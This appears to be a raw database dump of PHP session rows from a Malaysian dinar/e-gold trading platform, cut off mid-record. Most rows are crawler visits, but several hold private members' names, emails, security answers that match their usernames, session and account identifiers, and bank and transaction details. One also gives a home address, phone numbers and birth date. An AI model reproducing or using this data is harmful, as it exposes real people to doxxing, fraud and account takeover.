('dfbbe685734a33f75b9d46ccabdc7ca1', '115.164.82.142', 'Mozilla/5.0 (Linux; Android 6.0.1; D6503 Build/23.', 1461634059, 'a:1:{s:12:"me_id_parent";s:88:"5SXA-oVRTvsrcskhzSibF79hJCeXO0C3-OqK9qkkziTpc2K-UfqF_zr-Kokd1CnRZKi5_MqrIb1N_W4kOlpr0A==";}'),
('dfbeedcdb02901e5c8696abb41ba307b', '220.181.108.176', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461203764, ''),
('dfee49f84840aabeaa7ffd98c36c2224', '5.9.62.130', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461827415, ''),
('e0129641c09c583f869aac2aef66ce98', '157.55.39.37', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461507181, ''),
('e0257b5b6d6193aff492dfe795cedd54', '54.220.15.47', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 1461407983, 'a:1:{s:12:"me_id_parent";s:88:"ZSWbXcG551pyqjbrTdnwMmBc3US5QAq3DQZrFWBUYUJ0Hew-7OMNfgwTCpbrXk1_RCSWOEiadTLquVCUA2142w==";}'),
('e03b71f10251a7376674dd8d5ebbc1ca', '180.76.15.156', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461253271, ''),
('e042ea13d229fcae2e768cbf21d71356', '175.136.140.216', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461758141, ''),
('e04d66b06007a185b0404e1b68d20f50', '123.246.120.73', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)', 1461167107, ''),
('e0753af7c089a78bf3d72ef86b25a49f', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461734544, ''),
('e09f931b7f128f9b1f1254951010bcd8', '180.76.15.150', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461680680, ''),
('e0ec3205e0a9d92842a3cd3592d97e01', '180.76.15.34', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461834249, ''),
('e10a497d2fab828648ba27a5be5ac4f7', '180.76.15.24', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461875118, ''),
('e16434eb41b0fd30a7f73524dfc2ff51', '157.55.39.159', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461909173, ''),
('e165e90c2fa4556608aa58025298be4e', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160544, ''),
('e16ddb4e538ad6494ac7da4a25a6cbdf', '158.69.228.18', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko', 1461828315, ''),
('e187ec14bfc45697f00e748ae176c676', '180.76.15.15', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461203282, ''),
('e18d197cbbbb5e6d525c862f6bc148e8', '180.76.15.15', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461810198, ''),
('e19bd3d449240c595c6c018571206e45', '180.76.15.158', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461609187, ''),
('e1a75ada329da8d3721daf0b058c714b', '180.76.15.147', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461756508, ''),
('e1b53379b5ba192a56d86ce815d67283', '66.249.66.40', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461867570, ''),
('e1b6a9c05c6a63611169502d0132e4ec', '45.79.89.188', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461787196, ''),
('e1d80d2a732d05459605116a6c207df3', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2;', 1461188452, ''),
('e1fb39c251362f0e2b6b127bf70c4c8c', '203.106.159.247', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko', 1461426738, 'a:1:{s:12:"me_id_parent";s:1:"0";}'),
('e23aa1a9126dab875203a826dcd8cd0b', '199.16.156.124', 'Twitterbot/1.0', 1461485375, 'a:1:{s:12:"me_id_parent";s:88:"nuJe6Gtv0-CSvq2GeKjK5jZaxsNHzEBCg5GRS1Vxae_9JZbc7tTYSIH-mAc219qPzs5_mPj_Pal81-qMJNHywA==";}'),
('e295e6b1a01bd3dd41a7f9dc94bc7522', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461231997, ''),
('e2cb4eae4ca3e04e80823d3836bab73b', '66.249.69.10', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461552698, ''),
('e3169ebfde461c37345143bf0ed2dff6', '45.55.229.99', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) App', 1461718313, ''),
('e33588446d36b80b55b61c207a65c3c5', '14.1.198.129', 'Mozilla/5.0 (Linux; Android 5.0; SM-N9005 Build/LR', 1461503402, 'a:1:{s:12:"me_id_parent";s:88:"sg5J3ozWekCTmoZzL-enIQ_iSJcaMd6eFRUD4UItYgzHJi3p_jJ0Yc13F0QtiEOU3dXvPQV5CEu94QpA-hyIJg==";}'),
('e340b44e2cc44f79dcd4f4c9e41771de', '69.30.236.2', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461316067, ''),
('e3414e8692274b94d14be6da1a4b8eb1', '66.249.65.40', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461139446, ''),
('e3776ae4d25e08c5e266d7c023432050', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0', 1461856331, ''),
('e384006e202c238dc8c4a45789661d0b', '76.74.97.4', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 1461760237, ''),
('e38438fb0b954812d7060ac7495a6512', '54.248.153.153', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 1461408488, ''),
('e393ca3252ac9d0c227b66c1afa8a5ea', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461738077, ''),
('e3a244db3bb35c403a60b9380f925dbb', '103.1.71.32', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-N910C Build/', 1461498098, 'a:1:{s:12:"me_id_parent";s:88:"Ch0sX4HIwxuOtPX_DhRAHZwsZ_XFFRwLWcf3K75OtuUS384YdcJLGj-2YmRI2lA3v3R4aYsAZ6qISCbiVuIrag==";}'),
('e3c6c9ae3559dd5cbf7a8aab81b66173', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0;', 1461188281, ''),
('e3cd4dfa745f36340a2220c5bf4c87c2', '66.249.77.51', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461156306, ''),
('e3e25b3e84619ac80bccd41dacc401ad', '113.210.181.159', 'Mozilla/5.0 (Linux; Android 4.2.2; GT-I9205 Build/', 1461507404, 'a:1:{s:12:"me_id_parent";s:88:"AMRzs29Y6MXb5M1oJeivnYi8Gz_PsvYtEyW-nIG_Xoe_FPy95bDjaNajF00rrlpsZqYLfTxBJ-h5ANDXsnhGnA==";}'),
('e409b122fc75d89f1514003a39fe4da3', '66.249.69.217', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461576846, ''),
('e40cc6f634af80e87596145f0b77d423', '195.154.8.111', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461915185, ''),
('e4aebb7fa5e9bd42f209edf34396a907', '51.255.65.40', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461492284, ''),
('e4b578a8754502771717d76caa5241c5', '1.9.103.241', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J500G Build/', 1461488389, 'a:1:{s:12:"me_id_parent";s:88:"pcwr7z8Qc30wh_8LwGLAQ_uT9U3QvKBUMggYc5IJAu9DvAHALxT0jsGXJ55X2Y_d3dhMjO6YuExR7HHn6ix9MQ==";}'),
('e4b8a4bbb50c9be9360a6b35b5511e36', '157.55.39.45', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461607581, ''),
('e4fa8e10ca86a70f0d8f2447abc75ffc', '183.171.169.199', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_Z007 Build', 1461499433, 'a:1:{s:12:"me_id_parent";s:88:"KX8o4050wMdu8Rq4saORqwqqyxOZD-D8w_ArGPgxboA9_91gHcWxS0Vxpgh6-KIWS-tKEx0IPcxdOOuXGGkxOA==";}'),
('e4fe4bdc2dcd2d9f12784550d2f47232', '180.76.15.159', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461494563, ''),
('e509881ed53998f235afad5917d552ad', '180.76.15.12', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461806508, ''),
('e517bb8172d9549bbf5ab3cc841fc5b7', '52.91.155.36', 'DowntimeDetector/1.0 (+http://downforeveryoneorjus', 1461426747, ''),
('e51bb336972d5c39f634adaeefae3fd9', '180.76.15.141', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461566106, ''),
('e53a831c77d18ff4ae29e6f3faa11ba1', '209.19.191.136', 'Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/201001', 1461928468, ''),
('e53f532f4a24689dcf5c5ed0d4aa2f27', '180.76.15.32', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461595179, ''),
('e57ebbb8ea2130e7a35a650522c8f2bc', '180.76.15.22', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461708863, ''),
('e59a82af403785226ee2baaeb57dd0e4', '115.134.161.155', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (K', 1461319287, ''),
('e59cc316edb492d734a50e560782f931', '23.104.161.146', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) Ap', 1461411785, ''),
('e5a91a72cc036f66068e34ab469477aa', '13.92.241.115', 'semanticbot', 1461739116, ''),
('e5aa28b03c1e916ca4cd06d8b2d64413', '66.249.77.14', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461154096, ''),
('e5c619ffb63f9c72c70a73102874823b', '69.30.198.202', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461481026, ''),
('e5ea62270dc32919faa3ac9b0800dd28', '158.69.127.101', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Geck', 1461867100, ''),
('e5faa2d68ec2cbaa43cfdee0cf6a2a50', '54.206.141.121', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 1461408046, 'a:1:{s:12:"me_id_parent";s:88:"_DonSGLPOc3DMLA-g5i_Qi38w_-KHfOXQXUQXfGwnu3T8PjSl7uIXjDBJsQG0iXIuyskoseOsnYkQDftSztfwA==";}'),
('e5ff8bf456a2a82ed72424326bca11ad', '66.249.69.222', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461513251, ''),
('e6124dc82ef855086f783db1ec17f737', '115.164.218.182', 'Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-N5', 1461915498, 'a:1:{s:12:"me_id_parent";s:8:"UGReag==";}'),
('e63778314789112dca0ae2dcd30bd6c8', '13.92.241.115', 'semanticbot', 1461739128, ''),
('e65fac09a46c6f1a4cdbfe1f354335d3', '157.55.39.62', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461406586, ''),
('e68d8a739bb3eed6e6e0f4f79c25b411', '207.46.13.130', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461590442, ''),
('e6e5576e94675a2161f41e9263837eb4', '157.55.39.46', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461554456, ''),
('e7011844098aaff9a6dccaabe4e452ea', '115.135.237.193', 'Mozilla/5.0 (Linux; Android 5.1.1; F1f Build/LMY47', 1461428773, ''),
('e71384ef78b95a79eac345989e1b3bcb', '66.249.66.33', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461310325, ''),
('e72125b0aea18265364b0e54d0d51e77', '180.76.15.146', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461748820, ''),
('e7279b7cb9ff88db9997b8862d025eae', '115.134.161.155', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (K', 1461291423, 'a:83:{s:5:"me_id";s:2:"12";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:11:"nurulizwani";s:11:"me_lastname";s:11:"nurulizwani";s:11:"me_username";s:11:"nurulizwani";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:11:"nurulizwani";s:14:"me_unique_link";s:32:"69091538608efddbbc47fbdd828de9fe";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:20:"izwani5493@gmail.com";s:16:"me_register_date";s:19:"2016-04-21 11:39:27";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-21T11:40:29+08:00";s:12:"me_magic_num";s:32:"26554fcd9af2a829aa8f95e0f00fa656";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;s:7:"de_code";s:16:"VoWec2uvnXD0Ntym";s:16:"admin_account_no";s:14:"04042010006119";s:18:"admin_account_name";s:31:"Koperasi DinarPal Melaka Berhad";s:9:"de_amount";d:1202.1199999999998908606357872486114501953125;s:11:"deposit_fee";s:4:"2.00";s:7:"gst_tax";d:0.11999999999999999555910790149937383830547332763671875;s:8:"tr_notes";s:0:"";s:12:"payment_temp";a:9:{s:5:"ft_id";s:1:"4";s:10:"me_id_from";s:2:"12";s:8:"username";s:9:"Shafira09";s:8:"me_id_to";s:2:"20";s:5:"pt_id";s:1:"1";s:5:"at_id";s:1:"2";s:13:"table1_length";s:2:"10";s:5:"v_ids";a:1:{i:0;s:4:"2002";}s:8:"tr_notes";s:0:"";}s:15:"me_rec_fullname";s:19:"Shafira09 Shafira09";s:15:"me_rec_username";s:9:"Shafira09";s:7:"pt_desc";s:5:"Goods";s:7:"at_desc";s:15:"E-Gold Reserved";s:12:"amount_trans";s:6:"400.00";s:15:"send_fee_amount";s:4:"0.00";s:12:"total_weight";i:2;s:11:"img_deposit";s:0:"";s:11:"arr_deposit";s:0:"";s:18:"session_withdrawal";a:6:{s:5:"ft_id";s:1:"5";s:10:"me_id_from";s:2:"12";s:11:"tr_datetime";s:19:"2016-04-22 12:27:07";s:5:"at_id";s:1:"1";s:9:"tr_amount";s:4:"5000";s:5:"bc_id";s:1:"1";}s:5:"tr_id";i:104;s:11:"tr_datetime";s:19:"2016-04-22 15:06:44";s:7:"bank_to";s:11:"12345678910";s:11:"bank_holder";s:9:"SHAFIRA09";s:9:"bank_name";s:15:"Maybank Sdn Bhd";s:9:"tr_amount";s:8:"5,000.00";s:8:"ft_price";s:4:"3.00";s:6:"bc_fee";s:4:"2.00";s:10:"amount_get";s:8:"4,994.70";s:12:"gs_sub_total";d:1998;s:11:"gs_discount";d:222;s:6:"gs_fee";d:66.599999999999994315658113919198513031005859375;s:6:"gs_gst";d:3.99599999999999955235807647113688290119171142578125;s:11:"gs_datetime";s:19:"2016-04-22 15:09:14";s:7:"gs_amil";s:21:"Ustazah Amira Nadirah";}'),
('e7333b465a999e4081a9e0e33b8ec6d3', '51.254.121.188', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461757696, ''),
('e79ec3e8e85bfb4a6bf3965c8bd27258', '175.139.164.173', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461117174, ''),
('e7d9404cfe8071da52bc53811f5871b7', '113.210.62.149', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461640664, ''),
('e7e500a531cba5d3e49eaad5bedbdc71', '180.76.15.162', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461903435, ''),
('e842b3ee55b5d12fa7038536421d02ca', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461741376, ''),
('e8431e605a07c470ef4638e93797ef70', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1459402249, ''),
('e847efd2ebc25990b8fce2c32bee8aa2', '180.76.15.6', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461465653, ''),
('e869a80c92e26aae5f0448891a7cdebd', '1.9.102.246', 'Mozilla/5.0 (Linux; Android 5.0; SM-N9005 Build/LR', 1461428546, 'a:1:{s:12:"me_id_parent";s:88:"BTV5rtxtvKtAr3qCMLSaqsoho5qVpiYgXU5XIate95CvZPLUnST21Wbh4MxOXs7wY2UezhfTJoFVs6juoFdPFA==";}'),
('e8a8570364e0944ce3d1952371a2b824', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1459261361, ''),
('e8b6523baa16588dda0defeee1c806ae', '175.140.115.205', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461727084, ''),
('e90e484575b661a8080eff871dda1755', '180.76.15.21', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461635274, ''),
('e93505b38ad7b4d2122ef8fa9fce54e6', '207.46.13.50', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461523159, ''),
('e942c10622d79b4b72abd3d797ea358c', '207.46.13.26', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461258676, ''),
('e94bf6f113761d56705782a3422bbff8', '113.210.62.149', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461637934, ''),
('e96590c53c9bf2946f8070e3a0bfc6e7', '180.76.15.156', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461278704, ''),
('e9c7b78cbb4b522ebb057f118b1d75cf', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232003, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('e9cda080079364217884757ddef1b7cb', '157.55.39.45', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461637111, ''),
('ea496f7ba0e7ffba834e12ad0ab96df8', '45.33.59.157', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461558775, ''),
('eaa4fba3d7d6a2399af9eb6fed681389', '173.208.197.254', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1;', 1461536818, ''),
('eacf6119123c7cd296a1a2817dfec4fb', '180.76.15.9', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461620722, ''),
('eadb8e92d06e2509a8b99e965e0ac7aa', '66.249.69.217', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461641575, ''),
('eaf82806c07a0a6db44b51852ea041ea', '178.137.87.242', 'Mozilla/5.0 (Windows 10; WOW64; rv:41.0) Gecko/201', 1461170351, ''),
('eb07fdfd462b17816859c78f66317fe5', '66.249.69.61', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461566578, ''),
('eb0d0027ae501d5ea8914ef87582c6e5', '66.249.69.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461581119, ''),
('eb3ef8dd7ff98661eaa408ab9b2370cf', '183.171.28.81', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J700F Build/', 1461430438, 'a:1:{s:12:"me_id_parent";s:88:"3oLGSJdWJikSpScDlw5wVeIdzvIZSUHWGVTQ6baNcc99OI067MW26x0F6XEutx2dZ9R7QCW_5vWbWPluDhl14Q==";}'),
('eb71848ece12205835933f3e69d9aa52', '180.76.15.34', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461831554, ''),
('eb95455ba3f005cb10857dc27b0d8d3a', '66.249.66.55', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461306256, ''),
('eb9851b6d28c69f4861dd8f20d86e297', '14.192.210.30', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461499208, 'a:1:{s:12:"me_id_parent";s:88:"kPTbLawyFDkvk6orl8F2OAO3kWPDHdpyfltfVBu0d5z4iT90d991uSpnkDcThW-ipChVLm-kPRj_QhqbbKjiPg==";}'),
('ebf755657d0783848ee2beb626b29b34', '208.115.111.74', 'Mozilla/5.0 (compatible; DotBot/1.1; http://www.op', 1461618429, ''),
('ebf771234d9b85df9c9fefdf1e6d885f', '66.249.77.51', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461202354, ''),
('ec217ba774d9d1ebb5b38dc6194db9e7', '157.55.39.234', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461548226, ''),
('ec448e0ab4067aa178cd1f88149827cb', '188.138.33.173', 'libwww-perl/6.15', 1461408646, ''),
('ec4beaac0b80e9ca0c5fff995eea2377', '175.137.136.108', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) Ap', 1461420617, 'a:1:{s:12:"me_id_parent";s:88:"CT6o3V6gikC4qGpctTg50AkD8Am3BgaAinFWvfFUrWVB4gunTwWJ35BDOeEwWF8dexwz2MubmvEGXmK-VBfO9w==";}'),
('ec68374436567360f415f9459b5dc248', '180.76.15.151', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461713227, ''),
('ec8ae10f069eb171990b9400cf225c5a', '157.55.39.218', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461264640, ''),
('ec9db2db9068743c31d1f54126566e65', '91.121.221.15', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461751952, ''),
('ed18416f30103adcb0d03a78f270f215', '115.164.82.86', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac ', 1461437755, ''),
('ed2412aec1c6db6a15f300ee3147c2ca', '180.76.15.149', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461123680, ''),
('ed907fc23664d39788e45ab86232deb5', '5.39.222.159', 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; A1-81', 1461727376, ''),
('ede30e32fee754bb7fc14afadf9453fb', '175.136.140.216', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461902188, 'a:52:{s:5:"me_id";s:2:"55";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:8:"zulaikha";s:11:"me_lastname";s:8:"zulaikha";s:11:"me_username";s:8:"zulaikha";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:8:"zulaikha";s:14:"me_unique_link";s:32:"7e56f1b04034c2ee0104f44efa7c96f4";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:28:"zulaikhaabdullah75@gmail.com";s:16:"me_register_date";s:19:"2016-04-29 11:53:29";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"968b1b6bdc426e86092695466c3ae464";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:10:"me_is_amil";s:2:"no";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;}'),
('ede33ab7343b3a406868214a04d1a139', '74.91.20.194', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1;', 1461180659, ''),
('ee1e2f623b5de01e823466366cd2269c', '60.49.48.232', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) Ap', 1461409107, 'a:1:{s:12:"me_id_parent";s:88:"ZXf8Hxi7XaxRIJ4oVbKlLgut-BraQjVpDR6D7Z8EqX_oAQ6sfsRrTHHAlwvfHaRfhxCD3m_0J6ISdBGvOsLZAQ==";}'),
('ee798c2e6dcca9bd8d7d3c1abc37464f', '115.164.48.192', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-N9005 Build/', 1461473528, ''),
('eea302f632df9cc74bc9bc1b1957d7e1', '14.1.198.218', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461410651, 'a:50:{s:5:"me_id";s:2:"10";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"muhai";s:11:"me_lastname";s:5:"muhai";s:11:"me_username";s:5:"muhai";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"muhai";s:14:"me_unique_link";s:32:"1f224e9700571b8b26f31dfb323f1b5f";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:19:"muhai1991@gmail.com";s:16:"me_register_date";s:19:"2016-04-23 19:16:31";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-23T19:18:52+08:00";s:12:"me_magic_num";s:32:"3e533ec1872fb3b11675b85505da24a8";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;}'),
('eedebb3340fdb24f60695007be6bbbac', '13.92.241.115', 'semanticbot', 1461739117, ''),
('eee055ff7b90c422e2c258d23a2d72ef', '180.76.15.138', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461516448, ''),
('eeed2699455ae8b10cd4dd9f70f656e3', '123.125.71.12', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461817055, ''),
('eef202c327d1c973ce575aca5e1678f2', '115.134.161.155', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461229161, 'a:50:{s:5:"me_id";s:1:"3";s:8:"me_image";s:42:"6d3ac-adeq-nur---ftmk!-20150212_151603.jpg";s:12:"me_firstname";s:9:"Nur Umira";s:11:"me_lastname";s:7:"Mustafa";s:11:"me_username";s:3:"nur";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:3:"nur";s:14:"me_unique_link";s:32:"b55178b011bfb206965f2638d0f87047";s:11:"me_address1";s:44:"J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.";s:8:"me_city1";s:10:"AYER KEROH";s:9:"me_state1";s:6:"MELAKA";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"MALAYSIA";s:11:"me_address2";s:28:"91, JALAN KERAI, SG. RETANG.";s:8:"me_city2";s:8:"JERANTUT";s:9:"me_state2";s:6:"PAHANG";s:12:"me_postcode2";s:5:"27000";s:11:"me_country2";s:8:"MALAYSIA";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0136420142";s:13:"me_birth_date";s:10:"1993-05-18";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:33:"https://www.facebook.com/nurumira";s:10:"me_twitter";s:28:"https://twitter.com/nurumira";s:12:"me_instagram";s:29:"http://instagram.com/nurumira";s:13:"me_googleplus";s:30:"http://googleplus.com/nurumira";s:14:"me_whatsapp_no";s:10:"0199737579";s:11:"me_telegram";s:1:"-";s:9:"me_wechat";s:1:"-";s:8:"me_email";s:18:"nurumira@gmail.com";s:16:"me_register_date";s:19:"2015-04-